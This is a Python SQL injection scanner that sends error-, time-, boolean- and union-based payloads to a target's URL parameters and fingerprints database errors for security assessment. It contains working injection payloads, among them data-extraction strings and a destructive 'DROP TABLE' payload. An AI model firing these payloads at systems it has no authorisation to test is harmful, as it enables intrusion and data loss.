#!/usr/bin/env python3
"""
SQL Injection testing module with multiple detection techniques.

Usage:
    python sqli_tester.py --target https://example.com/search?q=test --output results/
"""

import argparse
import asyncio
import json
import re
import sys
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

# Add parent to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from core.http_client import AsyncHTTPClient, HTTPResponse
from core.result_manager import ResultManager, ScanResult, Finding, Severity
from core.payload_manager import PayloadManager
from core.response_analyzer import ResponseAnalyzer
from core.utils import setup_logging, load_config, normalize_url, extract_domain, timestamp_now, ensure_dir

logger = setup_logging("sqli_tester")


@dataclass
class SQLiVulnerability:
    """Represents a discovered SQL injection vulnerability."""

    url: str
    parameter: str
    method: str
    injection_type: str  # error, time, boolean, union
    payload: str
    evidence: str
    database_type: str = ""
    confidence: str = "medium"  # low, medium, high
    request: str = ""
    response_snippet: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return {
            "url": self.url,
            "parameter": self.parameter,
            "method": self.method,
            "injection_type": self.injection_type,
            "payload": self.payload,
            "evidence": self.evidence[:500] if self.evidence else "",
            "database_type": self.database_type,
            "confidence": self.confidence,
        }


class SQLiTester:
    """
    SQL Injection vulnerability tester.

    Features:
    - Error-based detection (multiple DB signatures)
    - Time-based blind detection
    - Boolean-based blind detection
    - Union-based detection
    - Multiple encoding support
    - Database fingerprinting
    """

    # Database error signatures
    DB_ERRORS = {
        "mysql": [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_",
            r"MySqlClient\.",
            r"MySqlException",
            r"valid MySQL result",
            r"check the manual that corresponds to your (MySQL|MariaDB)",
            r"MySqlNative",
            r"SQL syntax.*MariaDB server",
        ],
        "postgresql": [
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"PG::SyntaxError:",
            r"org\.postgresql\.util\.PSQLException",
            r"ERROR:\s+syntax error at or near",
        ],
        "mssql": [
            r"Driver.*SQL[\-\_\ ]*Server",
            r"OLE DB.*SQL Server",
            r"\bSQL Server[^&lt;&quot;]+Driver",
            r"Warning.*mssql_",
            r"\bSQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}",
            r"System\.Data\.SqlClient\.",
            r"(?s)Exception.*\WRoadhouse\.Cms\.",
            r"Microsoft SQL Native Client error",
            r"ODBC SQL Server Driver",
            r"SQLServer JDBC Driver",
            r"macaborreclient",
            r"com\.microsoft\.sqlserver\.jdbc",
        ],
        "oracle": [
            r"\bORA-\d{5}",
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*\Woci_",
            r"Warning.*\Wora_",
            r"oracle\.jdbc\.driver",
            r"quoted string not properly terminated",
            r"OracleException",
        ],
        "sqlite": [
            r"SQLite/JDBCDriver",
            r"SQLite\.Exception",
            r"System\.Data\.SQLite\.SQLiteException",
            r"Warning.*sqlite_",
            r"Warning.*SQLite3::",
            r"\[SQLITE_ERROR\]",
            r"SQLite error \d+:",
            r"sqlite3\.OperationalError:",
            r"SQLite3::SQLException",
        ],
        "generic": [
            r"SQL syntax",
            r"syntax error",
            r"mysql_fetch",
            r"Unclosed quotation mark",
            r"quoted string not properly terminated",
            r"You have an error in your SQL syntax",
            r"supplied argument is not a valid",
            r"Division by zero in",
            r"SQLSTATE\[",
        ],
    }

    # Time-based payloads (sleep values in seconds)
    TIME_PAYLOADS = [
        ("' AND SLEEP({time})--", "mysql"),
        ("' AND SLEEP({time})#", "mysql"),
        ("'; WAITFOR DELAY '0:0:{time}'--", "mssql"),
        ("' AND pg_sleep({time})--", "postgresql"),
        ("' || DBMS_PIPE.RECEIVE_MESSAGE('a',{time})--", "oracle"),
        ("' AND (SELECT {time} FROM (SELECT(SLEEP({time})))a)--", "mysql"),
        ("1' AND SLEEP({time}) AND '1'='1", "mysql"),
        ("1) AND SLEEP({time})--", "mysql"),
    ]

    # Boolean-based payloads
    BOOLEAN_PAYLOADS = [
        ("' AND '1'='1", "' AND '1'='2"),
        ("' AND 1=1--", "' AND 1=2--"),
        ("' OR '1'='1", "' OR '1'='2"),
        ("1' AND 1=1--", "1' AND 1=2--"),
        ("1) AND 1=1--", "1) AND 1=2--"),
        ("' AND 'a'='a", "' AND 'a'='b"),
        ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2"),
    ]

    # Error-based payloads
    ERROR_PAYLOADS = [
        "'",
        "\"",
        "'--",
        "\"--",
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' OR 1=1--",
        "1' ORDER BY 1--",
        "1' ORDER BY 100--",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "1'; DROP TABLE test--",
        "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
        "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.tables GROUP BY x)a)--",
        "1' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(VERSION(),0x3a,FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x LIMIT 1)--",
        "1' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
        "' AND 1=CONVERT(int,(SELECT @@version))--",
    ]

    # Union-based payloads
    UNION_PAYLOADS = [
        "' UNION SELECT {cols}--",
        "' UNION ALL SELECT {cols}--",
        "' UNION SELECT {cols}#",
        "\" UNION SELECT {cols}--",
        "') UNION SELECT {cols}--",
        "')) UNION SELECT {cols}--",
    ]

    def __init__(
        self,
        target: str,
        output_dir: str = "results",
        config: Optional[Dict] = None,
        proxy: Optional[str] = None,
        timeout: int = 30,
        threads: int = 10,
        time_threshold: float = 5.0,
        test_params: Optional[List[str]] = None,
        methods: Optional[List[str]] = None,
        verbose: bool = False,
    ):
        self.target = normalize_url(target)
        self.target_domain = extract_domain(target)
        self.output_dir = Path(output_dir)
        self.config = config or {}
        self.proxy = proxy
        self.timeout = timeout
        self.threads = threads
        self.time_threshold = time_threshold
        self.test_params = test_params
        self.methods = methods or ["GET"]
        self.verbose = verbose

        self.vulnerabilities: List[SQLiVulnerability] = []
        self.tested_params: Set[str] = set()
        self.baseline_responses: Dict[str, HTTPResponse] = {}

        self.payload_manager = PayloadManager()
        self.response_analyzer = ResponseAnalyzer()
        self.result_manager = ResultManager(output_dir)

        ensure_dir(self.output_dir)

    async def test(self) -> ScanResult:
        """Run SQL injection tests and return results."""
        result = ScanResult(
            tool="sqli_tester",
            target=self.target,
            config={
                "timeout": self.timeout,
                "threads": self.threads,
                "time_threshold": self.time_threshold,
                "methods": self.methods,
            },
        )

        logger.info(f"Starting SQL injection testing for: {self.target}")

        try:
            # Parse target URL for parameters
            parsed = urlparse(self.target)
            params = parse_qs(parsed.query)

            if not params and not self.test_params:
                result.add_error("No parameters found in URL. Use --params to specify.")
                logger.warning("No parameters found in URL")
                result.finalize()
                return result

            # Use specified params or discovered params
            test_params = self.test_params or list(params.keys())
            logger.info(f"Testing parameters: {test_params}")

            # Get baseline responses
            await self._get_baseline()

            # Run tests
            for param in test_params:
                logger.info(f"Testing parameter: {param}")

                # Error-based testing
                await self._test_error_based(param)

                # Time-based testing
                await self._test_time_based(param)

                # Boolean-based testing
                await self._test_boolean_based(param)

                # Union-based testing
                await self._test_union_based(param)

            # Calculate statistics
            result.stats = {
                "parameters_tested": len(test_params),
                "vulnerabilities_found": len(self.vulnerabilities),
                "by_type": self._count_by_type(),
                "by_database": self._count_by_database(),
            }

            # Add findings
            for vuln in self.vulnerabilities:
                severity = Severity.HIGH
                if vuln.confidence == "high":
                    severity = Severity.CRITICAL
                elif vuln.confidence == "low":
                    severity = Severity.MEDIUM

                result.add_finding(Finding(
                    title=f"SQL Injection ({vuln.injection_type}): {vuln.parameter}",
                    severity=severity,
                    description=f"{vuln.injection_type.title()}-based SQL injection in parameter '{vuln.parameter}'",
                    url=vuln.url,
                    parameter=vuln.parameter,
                    payload=vuln.payload,
                    evidence=vuln.evidence,
                    metadata={
                        "injection_type": vuln.injection_type,
                        "database_type": vuln.database_type,
                        "confidence": vuln.confidence,
                        "method": vuln.method,
                    },
                    cwe_id="CWE-89",
                    remediation="Use parameterized queries or prepared statements. Never concatenate user input into SQL queries.",
                ))

        except Exception as e:
            result.add_error(f"Testing error: {e}")
            logger.error(f"Testing error: {e}")

        result.finalize()
        return result

    async def _get_baseline(self):
        """Get baseline responses for comparison."""
        logger.info("Getting baseline responses...")

        async with AsyncHTTPClient(
            timeout=self.timeout,
            proxy=self.proxy,
        ) as client:
            # Normal request
            response = await client.get(self.target)
            self.baseline_responses["normal"] = response

            # Request with random value
            parsed = urlparse(self.target)
            params = parse_qs(parsed.query)
            if params:
                first_param = list(params.keys())[0]
                modified_params = params.copy()
                modified_params[first_param] = ["randomvalue12345"]
                new_query = urlencode(modified_params, doseq=True)
                random_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))
                response = await client.get(random_url)
                self.baseline_responses["random"] = response

    async def _test_error_based(self, param: str):
        """Test for error-based SQL injection."""
        logger.info(f"Testing error-based SQLi for: {param}")

        async with AsyncHTTPClient(
            timeout=self.timeout,
            proxy=self.proxy,
            max_retries=1,
        ) as client:
            for payload in self.ERROR_PAYLOADS:
                url = self._inject_payload(param, payload)

                try:
                    response = await client.get(url)

                    # Check for SQL errors
                    db_type, error_match = self._detect_sql_error(response.body)

                    if db_type:
                        vuln = SQLiVulnerability(
                            url=self.target,
                            parameter=param,
                            method="GET",
                            injection_type="error",
                            payload=payload,
                            evidence=error_match,
                            database_type=db_type,
                            confidence="high",
                            response_snippet=response.body[:500],
                        )
                        self.vulnerabilities.append(vuln)
                        logger.info(f"Found error-based SQLi: {param} ({db_type})")

                        if self.verbose:
                            logger.debug(f"Payload: {payload}")
                            logger.debug(f"Evidence: {error_match}")

                        return  # Found vulnerability, stop testing this param

                except Exception as e:
                    logger.debug(f"Error testing payload: {e}")

    async def _test_time_based(self, param: str):
        """Test for time-based blind SQL injection."""
        logger.info(f"Testing time-based SQLi for: {param}")

        async with AsyncHTTPClient(
            timeout=self.timeout + 10,  # Extra timeout for sleep
            proxy=self.proxy,
            max_retries=1,
        ) as client:
            # Get baseline timing
            start = time.time()
            await client.get(self.target)
            baseline_time = time.time() - start

            for payload_template, db_type in self.TIME_PAYLOADS:
                sleep_time = int(self.time_threshold)
                payload = payload_template.format(time=sleep_time)
                url = self._inject_payload(param, payload)

                try:
                    start = time.time()
                    response = await client.get(url)
                    elapsed = time.time() - start

                    # Check if response was delayed
                    if elapsed >= (baseline_time + sleep_time - 1):
                        # Verify with second request
                        start = time.time()
                        await client.get(url)
                        elapsed2 = time.time() - start

                        if elapsed2 >= (baseline_time + sleep_time - 1):
                            vuln = SQLiVulnerability(
                                url=self.target,
                                parameter=param,
                                method="GET",
                                injection_type="time",
                                payload=payload,
                                evidence=f"Response delayed by {elapsed:.2f}s (baseline: {baseline_time:.2f}s)",
                                database_type=db_type,
                                confidence="high",
                            )
                            self.vulnerabilities.append(vuln)
                            logger.info(f"Found time-based SQLi: {param} ({db_type})")
                            return

                except asyncio.TimeoutError:
                    # Timeout might indicate successful injection
                    vuln = SQLiVulnerability(
                        url=self.target,
                        parameter=param,
                        method="GET",
                        injection_type="time",
                        payload=payload,
                        evidence=f"Request timed out (threshold: {sleep_time}s)",
                        database_type=db_type,
                        confidence="medium",
                    )
                    self.vulnerabilities.append(vuln)
                    logger.info(f"Potential time-based SQLi (timeout): {param}")
                    return

                except Exception as e:
                    logger.debug(f"Error testing time payload: {e}")

    async def _test_boolean_based(self, param: str):
        """Test for boolean-based blind SQL injection."""
        logger.info(f"Testing boolean-based SQLi for: {param}")

        async with AsyncHTTPClient(
            timeout=self.timeout,
            proxy=self.proxy,
            max_retries=1,
        ) as client:
            for true_payload, false_payload in self.BOOLEAN_PAYLOADS:
                true_url = self._inject_payload(param, true_payload)
                false_url = self._inject_payload(param, false_payload)

                try:
                    true_response = await client.get(true_url)
                    false_response = await client.get(false_url)

                    # Compare responses
                    if self._responses_differ_significantly(true_response, false_response):
                        # Verify the pattern
                        baseline = self.baseline_responses.get("normal")
                        if baseline:
                            # True condition should match baseline more closely
                            true_sim = self._response_similarity(true_response, baseline)
                            false_sim = self._response_similarity(false_response, baseline)

                            if true_sim > false_sim + 0.1:  # Significant difference
                                vuln = SQLiVulnerability(
                                    url=self.target,
                                    parameter=param,
                                    method="GET",
                                    injection_type="boolean",
                                    payload=f"TRUE: {true_payload} | FALSE: {false_payload}",
                                    evidence=f"Response differs: true_len={len(true_response.body)}, false_len={len(false_response.body)}",
                                    confidence="medium",
                                )
                                self.vulnerabilities.append(vuln)
                                logger.info(f"Found boolean-based SQLi: {param}")
                                return

                except Exception as e:
                    logger.debug(f"Error testing boolean payload: {e}")

    async def _test_union_based(self, param: str):
        """Test for union-based SQL injection."""
        logger.info(f"Testing union-based SQLi for: {param}")

        async with AsyncHTTPClient(
            timeout=self.timeout,
            proxy=self.proxy,
            max_retries=1,
        ) as client:
            # First, determine number of columns
            num_columns = await self._detect_column_count(client, param)

            if num_columns:
                logger.info(f"Detected {num_columns} columns")

                # Test union injection
                for payload_template in self.UNION_PAYLOADS:
                    cols = ",".join(["NULL"] * num_columns)
                    payload = payload_template.format(cols=cols)
                    url = self._inject_payload(param, payload)

                    try:
                        response = await client.get(url)

                        # Check if union was successful (no errors, different from baseline)
                        baseline = self.baseline_responses.get("normal")
                        if baseline and response.status == 200:
                            db_type, _ = self._detect_sql_error(response.body)
                            if not db_type:  # No SQL error
                                if len(response.body) != len(baseline.body):
                                    vuln = SQLiVulnerability(
                                        url=self.target,
                                        parameter=param,
                                        method="GET",
                                        injection_type="union",
                                        payload=payload,
                                        evidence=f"Union query successful with {num_columns} columns",
                                        confidence="high",
                                    )
                                    self.vulnerabilities.append(vuln)
                                    logger.info(f"Found union-based SQLi: {param}")
                                    return

                    except Exception as e:
                        logger.debug(f"Error testing union payload: {e}")

    async def _detect_column_count(self, client: AsyncHTTPClient, param: str) -> Optional[int]:
        """Detect number of columns using ORDER BY."""
        for i in range(1, 21):
            payload = f"' ORDER BY {i}--"
            url = self._inject_payload(param, payload)

            try:
                response = await client.get(url)
                db_type, _ = self._detect_sql_error(response.body)

                if db_type:
                    # Error occurred, previous number was valid
                    return i - 1 if i > 1 else None

            except Exception:
                pass

        return None

    def _inject_payload(self, param: str, payload: str) -> str:
        """Inject payload into parameter."""
        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)

        if param in params:
            original_value = params[param][0]
            params[param] = [original_value + payload]
        else:
            params[param] = [payload]

        new_query = urlencode(params, doseq=True)
        return urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, new_query, parsed.fragment
        ))

    def _detect_sql_error(self, body: str) -> Tuple[str, str]:
        """Detect SQL error in response body."""
        body_lower = body.lower()

        for db_type, patterns in self.DB_ERRORS.items():
            for pattern in patterns:
                match = re.search(pattern, body, re.IGNORECASE)
                if match:
                    return db_type, match.group(0)

        return "", ""

    def _responses_differ_significantly(self, resp1: HTTPResponse, resp2: HTTPResponse) -> bool:
        """Check if two responses differ significantly."""
        # Status code difference
        if resp1.status != resp2.status:
            return True

        # Length difference > 10%
        len1, len2 = len(resp1.body), len(resp2.body)
        if len1 > 0 and len2 > 0:
            diff_ratio = abs(len1 - len2) / max(len1, len2)
            if diff_ratio > 0.1:
                return True

        return False

    def _response_similarity(self, resp1: HTTPResponse, resp2: HTTPResponse) -> float:
        """Calculate similarity between two responses."""
        if resp1.status != resp2.status:
            return 0.0

        len1, len2 = len(resp1.body), len(resp2.body)
        if len1 == 0 or len2 == 0:
            return 0.0

        # Simple length-based similarity
        return 1.0 - (abs(len1 - len2) / max(len1, len2))

    def _count_by_type(self) -> Dict[str, int]:
        """Count vulnerabilities by type."""
        counts: Dict[str, int] = {}
        for vuln in self.vulnerabilities:
            counts[vuln.injection_type] = counts.get(vuln.injection_type, 0) + 1
        return counts

    def _count_by_database(self) -> Dict[str, int]:
        """Count vulnerabilities by database type."""
        counts: Dict[str, int] = {}
        for vuln in self.vulnerabilities:
            db = vuln.database_type or "unknown"
            counts[db] = counts.get(db, 0) + 1
        return counts

    def save_results(self, result: ScanResult) -> Dict[str, str]:
        """Save results to files."""
        paths = self.result_manager.save(result, f"sqli_{self.target_domain}")

        # Save vulnerabilities JSON
        vuln_path = self.output_dir / f"sqli_vulns_{self.target_domain}.json"
        with open(vuln_path, "w") as f:
            json.dump(
                {
                    "target": self.target,
                    "timestamp": timestamp_now(),
                    "vulnerabilities": [v.to_dict() for v in self.vulnerabilities],
                },
                f,
                indent=2,
            )
        paths["vulnerabilities"] = str(vuln_path)

        return paths


async def main():
    parser = argparse.ArgumentParser(
        description="SQL Injection vulnerability tester"
    )
    parser.add_argument("-t", "--target", required=True, help="Target URL with parameters")
    parser.add_argument("-o", "--output", default="results", help="Output directory")
    parser.add_argument("-c", "--config", help="Config file path")
    parser.add_argument("-p", "--proxy", help="Proxy URL")
    parser.add_argument("--threads", type=int, default=10, help="Concurrent threads")
    parser.add_argument("--timeout", type=int, default=30, help="Request timeout")
    parser.add_argument("--time-threshold", type=float, default=5.0, help="Time-based detection threshold")
    parser.add_argument("--params", help="Parameters to test (comma-separated)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")

    args = parser.parse_args()

    config = {}
    if args.config:
        config = load_config(args.config)

    test_params = args.params.split(",") if args.params else None

    tester = SQLiTester(
        target=args.target,
        output_dir=args.output,
        config=config,
        proxy=args.proxy,
        timeout=args.timeout,
        threads=args.threads,
        time_threshold=args.time_threshold,
        test_params=test_params,
        verbose=args.verbose,
    )

    result = await tester.test()
    paths = tester.save_results(result)

    print(f"\n{'='*60}")
    print(f"SQL Injection Testing Complete: {args.target}")
    print(f"{'='*60}")
    print(f"Vulnerabilities Found: {len(tester.vulnerabilities)}")
    print(f"By Type: {result.stats.get('by_type', {})}")
    print(f"By Database: {result.stats.get('by_database', {})}")
    print(f"\nResults saved to:")
    for name, path in paths.items():
        print(f"  {name}: {path}")

    if tester.vulnerabilities:
        print(f"\n*** VULNERABILITIES FOUND ***")
        for vuln in tester.vulnerabilities:
            print(f"  [{vuln.confidence.upper()}] {vuln.injection_type}: {vuln.parameter} ({vuln.database_type or 'unknown'})")


if __name__ == "__main__":
    asyncio.run(main())
